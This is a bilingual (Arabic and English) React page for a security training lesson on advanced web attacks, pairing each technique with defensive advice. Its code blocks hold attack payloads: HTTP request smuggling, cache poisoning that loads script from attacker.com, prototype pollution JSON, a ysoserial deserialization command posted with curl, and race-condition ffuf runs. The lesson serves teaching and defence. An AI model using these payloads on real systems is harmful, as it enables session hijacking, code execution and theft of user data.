"use client";
import { LessonShell, Section, Callout, Code, Step, Analogy, TwoCol, Card, L } from "@/components/LessonShell";

export default function Page() {
  return (
    <LessonShell slug="advanced-web">
      <L
        ar={<>
          <Section title="الويب على مستوى الخبراء">
            <Analogy>OWASP Top 10 هو الأبجدية. الدرس هذا هو القواعد و الأدب. هنا نتعامل مع ثغرات فيها أكثر من «حقن قيمة»: نلاعب على المستوى البروتوكولي و المعماري حيث يفترض المطورون أن «الـ stack يحمي نفسه».</Analogy>
            <Callout kind="danger" title="استخدام مصرّح فقط">
              كل التقنيات هنا ضمن نطاق اختبارات اختراق رسمية (red team / bug bounty). تطبيقها على هدف بدون
              تفويض = جريمة فيدرالية.
            </Callout>
          </Section>

          <Section title="HTTP Request Smuggling — الخلاف بين الـ frontend و backend">
            <Analogy>تخيّل أن هناك حارسَين يقفان بينك و بين البنك: حارس عند البوابة (frontend/proxy) و حارس داخل الردهة (backend). كل واحد يحسب «الزائرين» بطريقة مختلفة. لو أرسلتَ شخصين ملتصقين، سيرى الأول واحداً فقط، فيدخل الاثنان معاً. هذا الـ Request Smuggling.</Analogy>
            <h3>أنواع الـ desync</h3>
            <ul>
              <li><b>CL.TE</b> — الـ frontend يستخدم Content-Length، الـ backend يستخدم Transfer-Encoding.</li>
              <li><b>TE.CL</b> — العكس.</li>
              <li><b>TE.TE</b> — كلاهما يدعمان TE لكن يفسّران obfuscation بشكل مختلف.</li>
              <li><b>HTTP/2 → HTTP/1 downgrade</b> — frontend HTTP/2 يحوّل لـ backend HTTP/1.</li>
              <li><b>H2.CL / H2.TE</b> — تهريب عبر HTTP/2 mismatched headers.</li>
            </ul>
            <Code lang="CL.TE classic">{`POST / HTTP/1.1
Host: target.gov
Content-Length: 13
Transfer-Encoding: chunked

0

SMUGGLED`}</Code>
            <p>الـ frontend يقرأ كامل الـ 13 بايت كرسالة واحدة. الـ backend يرى chunked → 0 = نهاية، فيعتبر <code>SMUGGLED</code> بداية رسالة <i>التالية</i> من ضحية حقيقية.</p>
            <h3>التأثير</h3>
            <ul>
              <li>سرقة الـ session cookies للمستخدمين القادمين.</li>
              <li>تسميم الـ cache.</li>
              <li>تجاوز الـ access controls على الـ frontend.</li>
              <li>تنفيذ XSS على ضحايا آخرين.</li>
              <li>سرقة كل الـ headers بما فيها الـ Authorization.</li>
            </ul>
            <h3>الكشف و الأدوات</h3>
            <ul>
              <li><b>HTTP Request Smuggler</b> (Burp extension by Albinowax).</li>
              <li><b>smuggler.py</b> (defparam).</li>
              <li><b>h2cSmuggler</b>.</li>
              <li>Burp Repeater مع timing differential analysis.</li>
            </ul>
            <Callout kind="good" title="الدفاع">
              <ol>
                <li>HTTP/2 end-to-end (لا downgrade للـ backend).</li>
                <li>رفض الطلبات التي تحوي Content-Length و Transfer-Encoding معاً.</li>
                <li>front-end و back-end من نفس البائع و نفس الإصدار.</li>
                <li>استخدم <b>haproxy/nginx h2-mode strict</b>.</li>
                <li>راقب طلبات بحجم body مختلف عن الـ Content-Length في الـ logs.</li>
              </ol>
            </Callout>
          </Section>

          <Section title="HTTP/2 و gRPC — أسطح هجوم جديدة">
            <ul>
              <li><b>Rapid Reset (CVE-2023-44487)</b> — DoS عبر فتح streams و إغلاقها فوراً.</li>
              <li><b>HPACK bombs</b> — header compression للضغط على الـ memory.</li>
              <li><b>CONTINUATION flood (CVE-2024-27316)</b> — frames بلا END_HEADERS.</li>
              <li>gRPC: تجاوز auth بـ <code>:authority</code> override، deserialization في الـ Protobuf.</li>
            </ul>
          </Section>

          <Section title="Server-Side Cache Poisoning">
            <Analogy>الـ CDN/cache هو موظف مكتبة يحفظ نسخة من كل كتاب يُطلب. لو خدعتَه بأن يحفظ «كتاباً مزيفاً» تحت اسم كتاب شرعي، كل من يطلبه لاحقاً سيحصل على المزيف.</Analogy>
            <Code lang="payload">{`# 1) ابحث عن header غير مدرج في الـ cache key
GET / HTTP/1.1
Host: target.gov
X-Forwarded-Host: attacker.com

# 2) لو الموقع يعكس X-Forwarded-Host في الـ HTML/JS:
<script src="//attacker.com/main.js">

# 3) الـ cache يحفظ النتيجة. كل زائر تالٍ يحمّل JS من المهاجم.`}</Code>
            <p>أداة: <b>Param Miner</b> (Burp) لاكتشاف الـ unkeyed inputs.</p>
            <Callout kind="good" title="الدفاع">
              لا تعكس headers غير موثوقة. أضِف كل header مؤثّر إلى الـ <code>Vary</code> أو الـ cache key. استخدم
              <b> normalization</b> صارم في الـ CDN.
            </Callout>
          </Section>

          <Section title="Web Cache Deception">
            <p>المعكوس للـ Cache Poisoning: تخدع الـ cache ليحفظ صفحة <b>خاصة</b> بمستخدم على أنها static.</p>
            <Code lang="payload">{`# المستخدم لديه /account => يُرجع بياناته الشخصية
# المهاجم يرسل له رابط:
https://target.gov/account/photo.css

# الـ proxy يرى ".css" => يحفظها كـ static
# المهاجم يفتح نفس الرابط => يحصل على بيانات الضحية`}</Code>
          </Section>

          <Section title="Prototype Pollution — JavaScript">
            <p>في JavaScript، كل object يرث من <code>Object.prototype</code>. تلويث هذا الـ prototype = تأثير على كل objects التطبيق.</p>
            <Code lang="JavaScript — vulnerable merge">{`// كود hashmap بسيط
function merge(target, source) {
  for (let k in source) {
    if (typeof source[k] === 'object') merge(target[k], source[k]);
    else target[k] = source[k];
  }
}

// payload في JSON body
{ "__proto__": { "isAdmin": true } }

// الآن: ({}).isAdmin === true لكل object في التطبيق!`}</Code>
            <p>Gadget chains معروفة على Express, Lodash, jQuery تتحول من PP إلى RCE.</p>
            <p>أدوات: <b>ppmap, ppfuzz, server-side-prototype-pollution-gadgets</b> (PortSwigger).</p>
            <Callout kind="good" title="الدفاع">
              <ul>
                <li>استخدم <b>Map</b> و <b>Object.create(null)</b> بدلاً من plain objects.</li>
                <li><b>Object.freeze(Object.prototype)</b> في الـ entrypoint.</li>
                <li>Node.js: شغّل بـ <code>--disable-proto=delete</code>.</li>
                <li>Lint بـ <b>eslint-plugin-security</b> + <b>semgrep</b>.</li>
              </ul>
            </Callout>
          </Section>

          <Section title="Insecure Deserialization — سلاسل الـ Gadgets">
            <p>الـ deserialization gadget chain هي تركيبة كائنات (موجودة بالفعل في الـ classpath) إذا فُكّ تشفيرها بترتيب معين تنفّذ كوداً.</p>
            <h3>أمثلة شهيرة</h3>
            <TwoCol>
              <Card title="Java" color="red">
                ysoserial — CommonsCollections1, Spring, Groovy, Hibernate.
                <br />ysoserial.net للـ .NET.
              </Card>
              <Card title="Python" color="red">
                pickle، PyYAML قبل safe_load — استخدم <code>__reduce__</code>.
              </Card>
              <Card title="PHP" color="red">
                phpggc — Laravel, Symfony, WordPress, Doctrine chains.
              </Card>
              <Card title=".NET" color="red">
                BinaryFormatter, NetDataContractSerializer — مع ysoserial.net.
              </Card>
            </TwoCol>
            <Code lang="ysoserial — Java">{`# توليد payload يستغل CommonsCollections1 لتنفيذ id
java -jar ysoserial.jar CommonsCollections1 'id' | base64

# يُحقن في أي endpoint يستخدم ObjectInputStream
curl -X POST https://target/api/import \\
  -H "Content-Type: application/x-java-serialized-object" \\
  --data-binary @payload.bin`}</Code>
            <Callout kind="good" title="الدفاع">
              <ul>
                <li>تحاشَ deserialization على بيانات خارجية أصلاً.</li>
                <li>إن لزم: استخدم whitelist صارم للـ classes (LookAheadObjectInputStream).</li>
                <li>الترقيع المستمر: Java SerialFilter، Microsoft AppDomainSwitches.</li>
                <li>JSON Schema / Protobuf بدلاً من native serialization.</li>
                <li>وقّع الـ payloads (HMAC) إن كان لا بد منها بين خدماتك الداخلية فقط.</li>
              </ul>
            </Callout>
          </Section>

          <Section title="OAuth & SSO Abuse — هجمات القفل الذهبي">
            <ul>
              <li><b>Account takeover via dangling redirect_uri</b> — تسجيل subdomain منتهي ثم استخدامه redirect.</li>
              <li><b>OAuth covert redirect</b> — redirect_uri فيه open redirect.</li>
              <li><b>SAML XSW (Signature Wrapping)</b> — التلاعب في الـ XML بحيث يتحقق التوقيع لجزء و يُقرأ جزء آخر.</li>
              <li><b>JWT confused deputy</b> — توكن من مصدر آخر يُقبل بسبب عدم فحص <code>iss</code>.</li>
              <li><b>Cross-tenant takeover</b> في الـ SaaS متعدد الـ tenants عبر misconfigured trust.</li>
            </ul>
          </Section>

          <Section title="GraphQL هجمات أعمق">
            <Code lang="GraphQL DoS — alias-based">{`{
  a1: user(id:1) { posts { comments { author { posts { comments { ... } } } } } }
  a2: user(id:2) { ... }
  ... 1000 aliases
}`}</Code>
            <ul>
              <li><b>Field suggestions</b> ينكشف schema حتى لو introspection معطل.</li>
              <li><b>Mutation race conditions</b>: alias متعدد لاستهلاك نقاط reward قبل التحقق.</li>
              <li>Authentication ضعيف على بعض الـ resolvers بسبب نسيان فحوصات.</li>
            </ul>
            <Callout kind="good" title="الدفاع">
              query depth limit + cost analysis + rate limit per IP/user + <b>persisted queries</b> فقط.
            </Callout>
          </Section>

          <Section title="Race Conditions — ثواني تكلف الملايين">
            <Analogy>تخيّل ATM فيه عيب: لو ضغطتَ زر السحب مرتين بسرعة فائقة قبل أن يحدّث الرصيد، يعطيك المبلغ مرتين. هذه حالة سباق (TOCTOU) — وقت الفحص ≠ وقت الاستخدام.</Analogy>
            <Code lang="exploit">{`# 50 طلب متزامن لاستخدام كوبون تخفيض مرة واحدة
turbo-intruder + race-single-packet attack
# أو
GO + curl --parallel
ffuf -threads 50 -u https://target/redeem?code=PROMO`}</Code>
            <ul>
              <li>أداة <b>Turbo Intruder</b> + <b>single-packet attack</b> (PortSwigger 2023) ترسل عشرات الطلبات في حزمة TCP واحدة.</li>
              <li>تأثيرات: تكرار سحب رصيد، تجاوز email verification، تسجيل اسم مستخدم محجوز.</li>
            </ul>
            <Callout kind="good" title="الدفاع">
              <ol>
                <li><b>Database-level locks</b> (<code>SELECT ... FOR UPDATE</code>).</li>
                <li>Idempotency keys على كل operation حساسة.</li>
                <li>Atomic decrement (<code>UPDATE ... SET stock = stock - 1 WHERE stock &gt; 0</code>).</li>
                <li>Distributed locks (Redis, Zookeeper) عند الحاجة.</li>
              </ol>
            </Callout>
          </Section>

          <Section title="منهجية اصطياد الثغرات الحقيقية">
            <ol>
              <li><b>اقرأ الكود إن أمكن</b>: source review &gt;&gt; black-box.</li>
              <li><b>اخرج عن الـ checklist</b>: OWASP خطوة، الإبداع خطوات.</li>
              <li><b>افهم business logic</b>: أكثر الثغرات قيمة هنا، لا في الـ payload.</li>
              <li><b>اربط الثغرات</b>: SSRF صغير + open redirect + IDOR = اختراق كامل.</li>
              <li><b>وثّق proof-of-impact</b> واضحاً للـ blue team.</li>
            </ol>
          </Section>
        </>}
        en={<>
          <Section title="Web at the expert level">
            <Analogy>OWASP Top 10 is the alphabet. This lesson is grammar and literature. We deal with vulnerabilities beyond "inject a value" — we play at the protocol and architectural layer where developers assume "the stack protects itself".</Analogy>
            <Callout kind="danger" title="Authorized use only">
              Every technique here is for formal pentests (red team / bug bounty). Using them on a target without
              authorization is a federal offense.
            </Callout>
          </Section>

          <Section title="HTTP Request Smuggling — disagreement between frontend and backend">
            <Analogy>Imagine two guards between you and the bank: one at the gate (frontend/proxy) and one in the lobby (backend). Each counts "visitors" differently. If you send two people stitched together, the first sees one — and both walk in. That's request smuggling.</Analogy>
            <h3>Desync variants</h3>
            <ul>
              <li><b>CL.TE</b> — frontend uses Content-Length, backend uses Transfer-Encoding.</li>
              <li><b>TE.CL</b> — the reverse.</li>
              <li><b>TE.TE</b> — both support TE but parse obfuscation differently.</li>
              <li><b>HTTP/2 → HTTP/1 downgrade</b> — frontend HTTP/2 translates to backend HTTP/1.</li>
              <li><b>H2.CL / H2.TE</b> — smuggling via HTTP/2 mismatched headers.</li>
            </ul>
            <Code lang="CL.TE classic">{`POST / HTTP/1.1
Host: target.gov
Content-Length: 13
Transfer-Encoding: chunked

0

SMUGGLED`}</Code>
            <p>Frontend reads the full 13 bytes as one message. Backend sees chunked → 0 = end, treating <code>SMUGGLED</code> as the start of the <i>next</i> real victim's request.</p>
            <h3>Impact</h3>
            <ul>
              <li>Hijacking session cookies of upcoming users.</li>
              <li>Cache poisoning.</li>
              <li>Bypassing frontend access controls.</li>
              <li>Stored XSS against other victims.</li>
              <li>Stealing all headers including Authorization.</li>
            </ul>
            <h3>Detection and tooling</h3>
            <ul>
              <li><b>HTTP Request Smuggler</b> (Burp extension by Albinowax).</li>
              <li><b>smuggler.py</b> (defparam).</li>
              <li><b>h2cSmuggler</b>.</li>
              <li>Burp Repeater + timing differential analysis.</li>
            </ul>
            <Callout kind="good" title="Defense">
              <ol>
                <li>HTTP/2 end-to-end (no downgrade to backend).</li>
                <li>Reject requests with both Content-Length and Transfer-Encoding.</li>
                <li>Frontend and backend from the same vendor and version.</li>
                <li>Use <b>haproxy/nginx h2-mode strict</b>.</li>
                <li>Log and alert on body-size != Content-Length.</li>
              </ol>
            </Callout>
          </Section>

          <Section title="HTTP/2 and gRPC — fresh attack surface">
            <ul>
              <li><b>Rapid Reset (CVE-2023-44487)</b> — DoS via opening and immediately resetting streams.</li>
              <li><b>HPACK bombs</b> — header compression to exhaust memory.</li>
              <li><b>CONTINUATION flood (CVE-2024-27316)</b> — frames without END_HEADERS.</li>
              <li>gRPC: auth bypass via <code>:authority</code> override, Protobuf deserialization.</li>
            </ul>
          </Section>

          <Section title="Server-Side Cache Poisoning">
            <Analogy>The CDN/cache is a librarian who keeps a copy of every book requested. Trick them into storing a "fake book" under a real title and every subsequent request gets the fake.</Analogy>
            <Code lang="payload">{`# 1) Find a header NOT in the cache key
GET / HTTP/1.1
Host: target.gov
X-Forwarded-Host: attacker.com

# 2) If the site reflects X-Forwarded-Host into HTML/JS:
<script src="//attacker.com/main.js">

# 3) The cache stores it. Every visitor loads attacker JS.`}</Code>
            <p>Tool: <b>Param Miner</b> (Burp) for discovering unkeyed inputs.</p>
            <Callout kind="good" title="Defense">
              Never reflect untrusted headers. Add every impactful header to <code>Vary</code> or the cache key. Apply
              strict <b>normalization</b> at the CDN.
            </Callout>
          </Section>

          <Section title="Web Cache Deception">
            <p>The mirror of cache poisoning: trick the cache into storing a user's <b>private</b> page as if it were static.</p>
            <Code lang="payload">{`# /account returns the user's personal data
# Attacker sends them a link:
https://target.gov/account/photo.css

# The proxy sees ".css" => caches it as static
# Attacker visits the same URL => gets the victim's data`}</Code>
          </Section>

          <Section title="Prototype Pollution — JavaScript">
            <p>In JS every object inherits from <code>Object.prototype</code>. Polluting it = affecting every object in the app.</p>
            <Code lang="JavaScript — vulnerable merge">{`function merge(target, source) {
  for (let k in source) {
    if (typeof source[k] === 'object') merge(target[k], source[k]);
    else target[k] = source[k];
  }
}

// JSON body payload
{ "__proto__": { "isAdmin": true } }

// Now: ({}).isAdmin === true for every object!`}</Code>
            <p>Known gadget chains in Express, Lodash, jQuery escalate PP into RCE.</p>
            <p>Tools: <b>ppmap, ppfuzz, server-side-prototype-pollution-gadgets</b> (PortSwigger).</p>
            <Callout kind="good" title="Defense">
              <ul>
                <li>Use <b>Map</b> and <b>Object.create(null)</b> instead of plain objects.</li>
                <li><b>Object.freeze(Object.prototype)</b> at the entrypoint.</li>
                <li>Run Node.js with <code>--disable-proto=delete</code>.</li>
                <li>Lint with <b>eslint-plugin-security</b> + <b>semgrep</b>.</li>
              </ul>
            </Callout>
          </Section>

          <Section title="Insecure Deserialization — gadget chains">
            <p>A deserialization gadget chain is a sequence of classes already present in the classpath that, when deserialized in a particular order, executes code.</p>
            <h3>Famous tools</h3>
            <TwoCol>
              <Card title="Java" color="red">
                ysoserial — CommonsCollections1, Spring, Groovy, Hibernate.
                <br />ysoserial.net for .NET.
              </Card>
              <Card title="Python" color="red">
                pickle, PyYAML before safe_load — abuse <code>__reduce__</code>.
              </Card>
              <Card title="PHP" color="red">
                phpggc — Laravel, Symfony, WordPress, Doctrine chains.
              </Card>
              <Card title=".NET" color="red">
                BinaryFormatter, NetDataContractSerializer — used with ysoserial.net.
              </Card>
            </TwoCol>
            <Code lang="ysoserial — Java">{`# Generate a payload exploiting CommonsCollections1 to run id
java -jar ysoserial.jar CommonsCollections1 'id' | base64

# Inject into any endpoint using ObjectInputStream
curl -X POST https://target/api/import \\
  -H "Content-Type: application/x-java-serialized-object" \\
  --data-binary @payload.bin`}</Code>
            <Callout kind="good" title="Defense">
              <ul>
                <li>Avoid deserializing untrusted data at all.</li>
                <li>If unavoidable: strict class whitelisting (LookAheadObjectInputStream).</li>
                <li>Stay patched: Java SerialFilter, Microsoft AppDomainSwitches.</li>
                <li>Prefer JSON Schema / Protobuf over native serialization.</li>
                <li>If used between internal services only, sign payloads (HMAC).</li>
              </ul>
            </Callout>
          </Section>

          <Section title="OAuth & SSO abuse — golden-key attacks">
            <ul>
              <li><b>Account takeover via dangling redirect_uri</b> — register an expired subdomain and use it as redirect.</li>
              <li><b>OAuth covert redirect</b> — redirect_uri pointing to an open redirect.</li>
              <li><b>SAML XSW (Signature Wrapping)</b> — XML manipulation so the signature validates one part while another is consumed.</li>
              <li><b>JWT confused deputy</b> — token from another issuer accepted because <code>iss</code> isn't validated.</li>
              <li><b>Cross-tenant takeover</b> in multi-tenant SaaS via misconfigured trust.</li>
            </ul>
          </Section>

          <Section title="GraphQL — deeper attacks">
            <Code lang="GraphQL DoS — alias-based">{`{
  a1: user(id:1) { posts { comments { author { posts { comments { ... } } } } } }
  a2: user(id:2) { ... }
  ... 1000 aliases
}`}</Code>
            <ul>
              <li><b>Field suggestions</b> leak the schema even with introspection disabled.</li>
              <li><b>Mutation race conditions</b>: aliasing to spend reward points before validation.</li>
              <li>Weak auth on individual resolvers because someone forgot a check.</li>
            </ul>
            <Callout kind="good" title="Defense">
              Query depth limit + cost analysis + per-user/IP rate limiting + <b>persisted queries only</b>.
            </Callout>
          </Section>

          <Section title="Race Conditions — seconds that cost millions">
            <Analogy>Imagine an ATM bug: hit Withdraw twice fast, before the balance updates, and you get the cash twice. That's a TOCTOU race — Time of Check ≠ Time of Use.</Analogy>
            <Code lang="exploit">{`# 50 concurrent attempts to redeem a single-use coupon
turbo-intruder + race-single-packet attack
# or
GO + curl --parallel
ffuf -threads 50 -u https://target/redeem?code=PROMO`}</Code>
            <ul>
              <li><b>Turbo Intruder</b> + <b>single-packet attack</b> (PortSwigger 2023) sends dozens of requests in one TCP packet.</li>
              <li>Impacts: duplicate withdrawals, bypassing email verification, claiming a reserved username.</li>
            </ul>
            <Callout kind="good" title="Defense">
              <ol>
                <li><b>Database-level locks</b> (<code>SELECT ... FOR UPDATE</code>).</li>
                <li>Idempotency keys on every sensitive operation.</li>
                <li>Atomic decrement (<code>UPDATE ... SET stock = stock - 1 WHERE stock &gt; 0</code>).</li>
                <li>Distributed locks (Redis, Zookeeper) where needed.</li>
              </ol>
            </Callout>
          </Section>

          <Section title="A methodology for finding real vulnerabilities">
            <ol>
              <li><b>Read the source if possible</b>: source review &gt;&gt; black-box.</li>
              <li><b>Step outside the checklist</b>: OWASP is one move; creativity is the rest.</li>
              <li><b>Understand the business logic</b>: the most valuable bugs hide here, not in the payload.</li>
              <li><b>Chain bugs</b>: a tiny SSRF + open redirect + IDOR = full compromise.</li>
              <li><b>Document a clear proof-of-impact</b> for the blue team.</li>
            </ol>
          </Section>
        </>}
      />
    </LessonShell>
  );
}
